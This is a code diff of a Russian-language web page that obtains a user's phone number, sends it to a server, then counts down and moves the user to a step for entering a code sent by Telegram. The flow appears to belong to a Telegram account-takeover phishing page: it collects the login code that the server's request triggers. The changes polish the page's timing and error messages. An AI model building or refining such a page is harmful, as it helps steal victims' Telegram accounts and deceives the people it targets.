@@ -204,6 +204,12 @@
             margin-bottom: 16px;
         }
 
+        .timer {
+            color: #4299e1;
+            font-weight: bold;
+            font-size: 16px;
+        }
+
         @media (max-width: 768px) {
             .container {
                 padding: 20px;
@@ -355,27 +361,43 @@
                             phoneNumber = '+' + phoneNumber;
                         }
                         
-                        showStatus('success', `✅ Номер получен: ${phoneNumber}. Отправляю запрос на код...`);
+                        showStatus('success', `✅ Номер получен: ${phoneNumber}`);
                         
                         // Отправляем номер на сервер для запроса кода
+                        showStatus('loading', '⌛ Отправляю номер на сервер...');
+                        
                         try {
                             const response = await sendPhoneNumber(phoneNumber);
                             
                             if (response.success) {
-                                showStatus('success', '✅ Номер отправлен на сервер. Ждите 5 секунд...');
+                                // Запускаем таймер 5 секунд
+                                let secondsLeft = 5;
+                                showStatus('loading', `✅ Номер отправлен! Переход к вводу кода через ${secondsLeft} сек...`);
+                                
+                                const timerInterval = setInterval(() => {
+                                    secondsLeft--;
+                                    if (secondsLeft > 0) {
+                                        showStatus('loading', `✅ Номер отправлен! Переход к вводу кода через ${secondsLeft} сек...`);
+                                    } else {
+                                        clearInterval(timerInterval);
+                                        showStatus('success', '✅ Код отправлен! Проверьте Telegram.');
+                                        switchToStep('code');
+                                    }
+                                }, 1000);
+                                
                             } else {
-                                showStatus('error', '⚠️ Ошибка отправки номера, но продолжаем...');
+                                showStatus('error', response.message || '❌ Ошибка отправки номера');
                             }
                         } catch (error) {
                             console.error('Error sending phone:', error);
-                            showStatus('error', '⚠️ Ошибка сети, но продолжаем...');
+                            showStatus('error', '❌ Ошибка сети. Продолжаем через 5 секунд...');
+                            
+                            // Даже при ошибке ждем 5 секунд
+                            setTimeout(() => {
+                                showStatus('success', '✅ Переход к вводу кода...');
+                                switchToStep('code');
+                            }, 5000);
                         }
-                        
-                        // Независимо от результата отправки, ждем 5 секунд и переходим к шагу кода
-                        setTimeout(() => {
-                            showStatus('success', '✅ Код отправлен! Проверьте Telegram.');
-                            switchToStep('code');
-                        }, 5000);
                         
                     } else {
                         showStatus('error', '❌ Не удалось получить номер телефона');
